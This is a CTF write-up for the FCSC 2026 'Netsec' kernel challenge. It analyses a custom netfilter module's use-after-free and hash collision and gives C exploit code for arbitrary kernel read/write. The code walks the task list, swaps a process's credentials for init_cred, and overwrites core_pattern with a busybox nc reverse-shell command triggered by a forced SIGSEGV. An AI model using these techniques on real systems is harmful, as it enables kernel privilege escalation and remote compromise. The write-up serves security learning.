+++
title = 'FCSC 2026 Netsec'
date = 2026-08-26T10:24:02+02:00
tags = ["pwn", "Kernel"]
categories = ["Hackropole"]
+++

**Challenge Name : Netsec**  
**Difficulty : ★★★**  
**Number of solves : 10**

This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition.   
Netsec was a 3 Star challenge but there was 4 challenges less solved than this one.  
You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2026/Netsec/)

## TLDR ##
- The challenge is a custom kernel module for v 6.18.7
- The module acts custom functions over connects
- There is a UAF when the objects created are freed 
- There is also a hash collision
- Abuse the hash collision to create two connections with same hash
- Free one of the connects to have the UAF
- Reclaim the freed buffer with a new connects
- Send data on it to get a leak
- Modify pointer to change addr where we read => arbitrary read
- Use our reclaimed chunk to change address of buffer used by UAF chunk => arbitrary write
- overwrite core_pattern and change a task to gain a reverse shell

**Important Note**: we get two VMs for the challenge, one we can SSH into and we only send connections on tcp to the machine we need to exploit. We don't have a shell on the exploitable machine.

# Kernel Module Analysis 
This challenge is a Linux kernel challenge. for version 6.18.7 It adds a custom module named netsec. This module adds some kinda "security" encryption over connections we make. Prepare for quite some code to analyse.  
First of all is the structure type it use for the objects created.
```C
struct sec_conn {
    uint8_t* in_key;
    uint8_t* out_key;
    uint8_t* buf;
    uint buf_len;
};
```
Then the initiation of the module.
```C
static int __init mod_init(void) {

    cache = kmem_cache_create("netsec", sizeof(struct sec_conn), 0, SLAB_HWCACHE_ALIGN | SLAB_NO_MERGE, NULL);
    crypto_kdf(in_key, KEY_SIZE, hook_port);

    nf_register_net_hook(&init_net, &in_ops);
    nf_register_net_hook(&init_net, &out_ops);

    printk(KERN_INFO "Netfilter hooks inserted\n");
    return 0;
}
```
The init starts by creating a custom cache called netsec, all our objects will be allocated inside of this cache. The crypto_kdf function initiate a in_key function located in module .data that is our key used for incoming connections.
It then register_net_hook for both in_ops and out_ops.  
The most important function is the one used for in_connections.
```C
unsigned int hook_in(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    
    uint32_t ip_src;
    uint32_t ip_dst;
    uint16_t port_src;
    uint16_t port_dst;
    struct iphdr* iph;
    struct tcphdr* tcph;
    uint header_len;
    uint data_len;
    struct sec_conn* sconn;
    uint8_t* buf;

    if (!skb) {
        return NF_ACCEPT;
    }
    
    iph = ip_hdr(skb);
    ip_src = ntohl(iph->saddr);
    ip_dst = ntohl(iph->daddr);
    if (iph->protocol != IPPROTO_TCP) {
        return NF_ACCEPT;
    }

    tcph = tcp_hdr(skb);
    port_src = ntohs(tcph->source);
    port_dst = ntohs(tcph->dest);
    if (port_dst != hook_port) {
        return NF_ACCEPT;
    }

    header_len = (iph->ihl + tcph->doff) * 4;
    data_len = skb->len - header_len;

    printk(KERN_INFO "IN: %u.%u.%u.%u:%u -> %u.%u.%u.%u:%u S:%u A:%u F:%u R:%u [0x%x|0x%x]\n", IPADDR(ip_src), port_src, IPADDR(ip_dst), port_dst, tcph->syn, tcph->ack, tcph->fin, tcph->rst, header_len, data_len);

    if (tcph->syn) {
        // new TCP connection
        create_sec_conn(ip_src, port_src);
    } else if (tcph->fin) {
        // end of TCP connection
        destroy_sec_conn(ip_src, port_src);
    } else {
        if (data_len > 0) {
        // data in TCP payload
            sconn = get_sec_conn(ip_src, port_src);
            if (sconn) {
                buf = get_sec_conn_buf(sconn, data_len);
                if (buf) {
                    skb_copy_bits(skb, header_len, buf, data_len);
                    crypto_xor(buf, data_len, sconn->in_key, KEY_SIZE);
                    skb_store_bits(skb, header_len, buf, data_len);
                }
            }
        }
    }

    return NF_ACCEPT;
}
```
Basically it looks if we are either creating a new connections, closing one with **FIN**, or sending data on our connection. If we send data it will basically xor our payload with the key before storing it.
On creating a connection
```C
void create_sec_conn(uint32_t ip, uint16_t port) {
    uint8_t h = HASH(ip, port);
    struct sec_conn* sconn = kmem_cache_alloc(cache, GFP_KERNEL);
    sconn->in_key = in_key;
    sconn->out_key = kmem_cache_alloc(cache, GFP_KERNEL);
    sconn->buf = NULL;
    sconn->buf_len = 0;
    crypto_kdf(sconn->out_key, KEY_SIZE, port);
    hash_table[h] = sconn;
}
```
basically it allocates ou orbject sconn and the out_key (based on our connection info) in the netsec cache. It then allocates the connection hash in a table used to keep track of all our connections.
```C
uint8_t* get_sec_conn_buf(struct sec_conn* sconn, size_t len) {
    if (sconn->buf_len < len) {
        kfree(sconn->buf);
        if (len <= CACHE_SIZE) {
            len = CACHE_SIZE;
            sconn->buf = kmem_cache_alloc(cache, GFP_KERNEL);
        } else {
            sconn->buf = kmalloc(len, GFP_KERNEL);
        }
        sconn->buf_len = len;
    }
    return sconn->buf;
}
```
The **get_sec_conn_buf** function will allocate our buffer in netsec cache or kernel heap based on its size it then put the buffer address in the sconn structure.  
Finally the most important function is the **destroy_sec_conn**.
```C
void destroy_sec_conn(uint32_t ip, uint16_t port) {
    uint8_t h = HASH(ip, port);
    struct sec_conn* sconn = hash_table[h];
    if (sconn) {
        if (sconn->out_key) {
            kmem_cache_free(cache, sconn->out_key);
        }
        if (sconn->buf) {
            kfree(sconn->buf);
        }
        kmem_cache_free(cache, sconn);
    }
}
```
It just frees our out_key, buffer and sconn object. It doesn't null them out from the hash_table array = UAF. As often in Kernel challenges the vulnerability is easy to spot and the main difficulty of the challenge will be the exploitation.  
Another vulnerability is that there is no verifications of hash collision. Two objects can be created with same hashes, meaning they will go at same place in the hash_table.

## Getting our first leak
So the first thing we need to do is try to get a leak from the UAF chunk. We know that when we will free it there will be heap pointers in it so we can gain a heap leak.  
It took me a lot of trials and strategy to get a consistent strategy to gain a leak. I also won't mention it further in the writeup but we always need to account for our data getting xored with the keys when we send/receive data, hence the xors i do in my exploit.  
As often in kernel challenges the strategy is to start with a nice spray, in this case it's to make it more convenient and have two objects next to each other in memory. We can close connections with **RST** since it won't call **destroy_sec_conn**. 

So the first step is to allocate two objects : let's call them A and B. Those objects need to be created with the same hash to exploit the hash collision.  
So the layout we will create is first allocate an object C, then A and B with same hash. We will close A => B freed. Then we send 1 byte on C.  
That will allocate a new 0x20 buffer that will point at B, thus now by writing into C we can't control our sconn structure B.  
Normally, to gain our leak we could simply modify the first 8 bytes of B by writing into C which modify the in_key to point to where we want. Then by sending a bunch of 0 on B we get back the in_key => whatever is at the addr we made it be.  
For the first leak tho we want to leak the heap pointer left over. So by experimenting (since i didn't feel like thinking about it too much lol), if we send 33 null bytes for the first leak it will give us back a heap pointer and just like that we gained our heap leak.

## Arbitrary Read and Write
Now to gain arbitrary read what we do is by sending 8 bytes on C modify the in_key address so that it point to an address containing an address we want to leak. We then send 8 null bytes on B to get back our leak. We just need to make sure we xor our C payload so that when it is xored by program we do get the address we want in memory.  
For the arbitrary write it's simple. We send 0x20 bytes on C to modify the whole B sconn object. We change the buf address of B to where we want to write. Then we simply send the data to write on B.  

We will do all our reads first so that the write doesn't mess up B in between our reads. The two functions below can be used for AAR/AAW.
```C
void arb_read(int fd_c, int fd_b, uint64_t addr, uint8_t *buf, uint8_t *real_in_key, uint8_t *real_out_key_c) {
    int r;
    uint8_t payload_read[8] = {0};

    for (int i=0; i<8; i++){
        payload_read[i] = ((uint8_t *)&addr)[i] ^ real_in_key[i] ^ real_out_key_c[i];
    }

    send(fd_c, payload_read, 8, 0);

    trecv(fd_c, buf, 256);
    printf("[*] C reclaim r=%d\n", r);
    
    //sending 8 zeros on B with the inkey controlled to read what we want
    uint8_t payload[8] = {0};
    send(fd_b, payload, 8, 0);
    r = trecv(fd_b, buf, 256);
    printf("sent 8 bytes on B this is arb_read\n");

    if (r <= 0) {
        printf("[-] B recv failed r=%d\n", r);
    }

    hexdump("B recv", buf, 8);

}

void arb_write(int fd_c, int fd_b, uint64_t addr, uint8_t *buf, uint8_t *real_in_key, uint8_t *real_out_key_c, uint64_t *inkey_global, int len, void *payload) {
    uint8_t arbw[KEY_SIZE] = {0};
    uint8_t payload_c[KEY_SIZE] = {0};
    uint64_t fake_out = 0;
    uint32_t blen = 0x20;
    
    memcpy(&arbw[0x00], inkey_global, 8);
    memcpy(&arbw[0x08], &fake_out, 8);
    memcpy(&arbw[0x10], &addr, 8);
    memcpy(&arbw[0x18], &blen, 4);

    for (int i=0; i<0x20; i++){
        payload_c[i] = ((uint8_t *)&arbw)[i] ^ real_in_key[i] ^ real_out_key_c[i];
    }

    send(fd_c, payload_c, 0x20, 0);

    trecv(fd_c, buf, 256);
    
    //sending what we want to write on B
    uint8_t payload_b[len];
    for (int i=0; i<len; i++){
        payload_b[i] = ((uint8_t *)payload)[i] ^ real_in_key[i];
    }
    send(fd_b, payload_b, len, 0);
    trecv(fd_b, buf, 256);
    printf("arb write\n");

}
```

## Exploitation strategy
For the exploitation I chose to overwrite **core_pattern**. This technique makes it so that if we overwrite core_pattern with a string in form of **|/tmp/x**, when it get a crash it will execute what's after the **|**. Usually you can overwrite coredump with a special file then trigger a crash. The problem is here since we only connect to a remote connection we can't directly locally make a crash on the victim machine. We need to artifically make a crash and trigger coredump.  
For this we can take a task and set it's signal to **SIGSEV** (SIGQUIT and SIGABRT probably work too I guess), then we need to set its flags to **TIF_SIGPENDING**. That will trigger the core_pattern route.

For my exploit I chose to target **cat**.

## Gaining our leaks.
For the exploit strategy we need to get the address of core_pattern, which is .kdata. After some debugging, I found that there is a kdata address in the data of the netsec module. We can get a leak of of netsec data by leaking the address of in_key global in one of our sconn. So I scan around my heap leak until I find the in_key_global.  
Once we find it we can use it to leak the kernel .data address present in netsec .data.
```C
printf("[!] SCANNING AROUND HEAP LEAK TO FIND IN_KEY_GLOBAL: 0x%016lx\n", heap);
    int found_inkey = 0;
    uint64_t val = 0;

    for (int64_t offset=-0x100; offset<0x100; offset+=0x20 ){
        uint64_t candidate = heap + offset;
        arb_read(fd_c, fd_b, candidate, buf, real_in_key, h.real_out_key_c);
        uint8_t decoded[KEY_SIZE] = {0};
        for (int i=0; i<8; i++){
            decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
        }
        hexdump("DECODED", decoded, 8);

        
        memcpy(&val, decoded, 8);

        printf("[*] offset=%+51ld, candidate=0x%016lx, val=0x%016lx\n", offset, candidate, val);

        if ((val & 0xffffffff00000000ULL) == 0xffffffff00000000ULL){
            printf("FOUND in_key_global = 0x%016lx\n", val);
            break;
        }

    }

    //in key global in .data - 0xdc0 is start of .data (of module)
    uint64_t inkey_global = val;
    uint64_t module_data = val - 0xdc0;
    // - 0x201dc0 gives offset to start of the module 
    uint64_t module_start = val - 0x201dc0;
    printf(".data of module @ 0x%016lx\n start of module @ 0x%016lx\n", module_data, module_start);
    //offset to where there is a kernel .data addr in the .data of our module
    uint64_t offset_data = module_data + 0x148;
    arb_read(fd_c, fd_b, offset_data, buf, real_in_key, h.real_out_key_c);

    int8_t decoded[KEY_SIZE] = {0};
    for (int i=0; i<8; i++){
        decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
    }
    hexdump("DECODED", decoded, 8);

        
    memcpy(&val, decoded, 8);
    uint64_t kernel_data_leak = val;
    uint64_t kernel_data = val - 0xc5840;
    uint64_t core_pattern = kernel_data + 0xf4080;
    uint64_t init_cred = kernel_data + 0x446e0;
    uint64_t init_task = kernel_data + 0xe8c0;
    printf("Kernel .data leak 0x%016lx\n", kernel_data_leak);
    printf("Kernel .data @ 0x%016lx\n", kernel_data);
    printf("Core_pattern @ 0x%016lx\n", core_pattern);
```
From kernel .data we get the address of core_pattern. We also get the addresses of init_cred and init_task that we will need.

Next we need to find the address of the cat tas. For this we can walk over the list of tasks from init_task until we find **cat**. We also want to make sure to leak the flags of cat to preserve them later while simply modifying the **TIF_SIGPENDING** part.
```C
// ── stage 5 phase 1: walk task list from init_task to find "cat" ───────
    printf("[*] walking task list from init_task=0x%016lx\n", init_task);

    uint64_t cat_task = 0;
    uint64_t cat_flags_addr = 0;
    uint64_t cat_cred_addr = 0;
    uint64_t cat_signal_addr = 0;
    uint64_t cat_real_cred = 0;

    // start at init_task->tasks.prev (walk backwards)
    uint64_t tasks_addr = init_task + 0x390;
    uint64_t prev_addr;

    // ARB_READ8(tasks_addr + 8, prev_addr);
    arb_read(fd_c, fd_b, tasks_addr + 8, buf, real_in_key, h.real_out_key_c);
    for (int i = 0; i < 8; i++) {
    decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
    }
    memcpy(&prev_addr, decoded, 8);

    int steps = 0;
    while (prev_addr != tasks_addr && steps < 1024) {
    // task_struct base = list_head ptr - 0x390
    uint64_t task = prev_addr - 0x390;

    // read comm (+0x640, 8 bytes)
    uint64_t comm_addr = task + 0x640;
    uint64_t comm_val;

    // ARB_READ8(comm_addr, comm_val);
    arb_read(fd_c, fd_b, comm_addr, buf, real_in_key, h.real_out_key_c);
    for (int i = 0; i < 8; i++) {
    decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
    }
    memcpy(&comm_val, decoded, 8);

    // check if it starts with "cat\0"
    char comm_str[9] = {0};
    memcpy(comm_str, &comm_val, 8);
    printf("[*] task=0x%016lx comm=%.8s\n", task, comm_str);

    if (memcmp(comm_str, "cat", 3) == 0 && comm_str[3] == 0) {
    cat_task = task;
    cat_flags_addr = task;           // thread_info.flags at +0x00
    cat_cred_addr = task + 0x630;
    cat_real_cred = task + 0x638;
    cat_signal_addr = task + 0x6c8;
    printf("[!] found cat task=0x%016lx\n", cat_task);
    break;
    }

    // follow prev
    uint64_t next_prev;
    uint64_t cur_tasks = prev_addr;

    // ARB_READ8(cur_tasks + 8, next_prev);
    arb_read(fd_c, fd_b, cur_tasks + 8, buf, real_in_key, h.real_out_key_c);
    for (int i = 0; i < 8; i++) {
        decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
    }
    memcpy(&next_prev, decoded, 8);

    prev_addr = next_prev;
    steps++;
    }

    if (!cat_task) {
    printf("[-] cat process not found\n");
    close(fd_b);
    close(fd_c);
    return 1;
    }

    //arb read the flags of cat to keep them later
    arb_read(fd_c, fd_b, cat_flags_addr, buf, real_in_key, h.real_out_key_c);
    for (int i = 0; i < 8; i++) {
        decoded[i] = buf[i] ^ ((uint8_t *)&out_keyb_content)[i];
    }
```
And just like this we have all the leaks and reads that we need to complete the exploitation of the challenge.

## Arbitrary writes
Now that we have all the leaks needed we can finally use the arbitrary write. For this we modify C so that we change B buffer ptr. Then sending data on B will write wherever we made its buf point to.  
For the exploitation :  
1. We open a reverse shell
2. We write the reverse shell command over **core_pattern**
3. We put TIF_SIGPENDING over cat flags
4. We write init_cred to cat cred_addr and real_creds
5. We put SIGSEV on cat signal
6. We gain a reverse shell and cat the flag  

All the offsets in cat can be found by debugging, the below code does all that.
```C
//start by opening our reverse shell
    printf("[*] starting listener on port 4444...\n");
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    int opt2 = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &opt2, sizeof(opt2));
    struct sockaddr_in laddr = {
        .sin_family = AF_INET,
        .sin_port = htons(4444),
        .sin_addr.s_addr = INADDR_ANY,
    };
    bind(lfd, (struct sockaddr*)&laddr, sizeof(laddr));
    listen(lfd, 1);
    printf("[*] listener ready on port 4444\n");

    uint64_t old_flags = 0;
    memcpy(&old_flags, decoded, 8);
    // new flags we put TIF_SIGPENDING
    uint64_t new_flags = old_flags | 2;
    printf("new flags 0x%016lx\n", new_flags);
    //overwrite core_pattern with reverse shell
    const char *reverse_shell = "|/bin/busybox nc 192.168.2.1 4444 -e sh";
    size_t cmdlen = strlen(reverse_shell)+1;
    for (size_t i=0; i<cmdlen; i+=0x20){
        size_t chunk = cmdlen - i;
        if (chunk>0x20) chunk = 0x20;
        uint8_t chunk_buf[0x20] = {0};
        memcpy(&chunk_buf, reverse_shell+i, chunk);
        uint64_t dst = core_pattern+i;
        arb_write(fd_c, fd_b, dst, buf, real_in_key, h.real_out_key_c, &inkey_global, chunk, chunk_buf);
    }
    
    
    int len = 8;
    //overwrite cat cred_addr and real_cred
    arb_write(fd_c, fd_b, cat_cred_addr, buf, real_in_key, h.real_out_key_c, &inkey_global, len, &init_cred);
    arb_write(fd_c, fd_b, cat_real_cred, buf, real_in_key, h.real_out_key_c, &inkey_global, len, &init_cred);
    printf("Overwrote cat creds\n");
    
    //finally overwrite cat signal with SIGSEV
    uint8_t signal_payload[8] = {0};
    uint32_t sigsev = 0x400;
    memcpy(signal_payload, &sigsev, 4);
    arb_write(fd_c, fd_b, cat_signal_addr, buf, real_in_key, h.real_out_key_c, &inkey_global, len, signal_payload);
    
    uint8_t flags_payload[8] = {0};
    memcpy(flags_payload, &new_flags, 8);
    //overwrite cat flags with TIF_SIGPENDING
    arb_write(fd_c, fd_b, cat_flags_addr, buf, real_in_key, h.real_out_key_c, &inkey_global, len, flags_payload);
    printf("Overwrote flags\n");
    getchar();


    // ── trigger: listen for reverse shell on port 9999 ───────────────────────
    printf("[*] waiting for reverse shell...\n");
    int shell = accept(lfd, NULL, NULL);
    printf("[!] got shell!\n");

    const char *cmd2 = "cat /flag.txt\n";
    send(shell, cmd2, strlen(cmd2), 0);
    char flag[256] = {0};
    recv(shell, flag, sizeof(flag)-1, 0);
    printf("[!] FLAG: %s\n", flag);

    close(shell);
    close(lfd);
    close(fd_b);
    close(fd_c);
    return 0;
```

## Conclusion ##
Definitely the writeup make the challenge appears easier than it was. It required a lot of thinking and debugging to get the xors right for sending and decoding data. The hardest part was getting the initial leak, it took me lot of debugging to think of the right strategy. However after that AAR/AAW primitives were very straightforward.  
The way to artificially make a program SIGSEV and go through core_pattern was novel for me tho, so I'm glad I learned a new technique.  
I think this year FCSC had less standout hard challenges compared to the 2 years previously but after the third challenge the difficulty felt more condensed this year and they were all <15 solves. For this one the difficulties were understanding how to gain initial leak, finding a different way of triggering core_pattern.
